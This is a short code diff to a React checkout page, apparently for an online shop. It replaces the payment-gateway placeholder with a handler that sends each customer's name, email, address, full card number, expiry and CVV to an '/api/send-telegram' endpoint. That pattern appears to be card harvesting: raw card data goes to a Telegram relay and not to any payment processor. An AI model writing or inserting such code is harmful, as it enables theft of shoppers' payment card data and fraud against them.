@@ -22,12 +22,32 @@ const Checkout = () => {
     setForm((f) => ({ ...f, [name]: value }))
   }
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
-    // here you would send the form + cart info to your backend/payment gateway
-    console.log('Submitting payment details', form, items)
-    clearCart()
-    navigate('/thank-you')
+
+    try {
+      await fetch('/api/send-telegram', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          form: {
+            name: form.name,
+            email: form.email,
+            address: form.address,
+            cardNumber: form.cardNumber,
+            expiry: form.expiry,
+            cvv: form.cvv,
+          },
+          items,
+          total,
+        }),
+      })
+
+      clearCart()
+      navigate('/thank-you')
+    } catch (error) {
+      console.error('Telegram error:', error)
+    }
   }
 
   return (
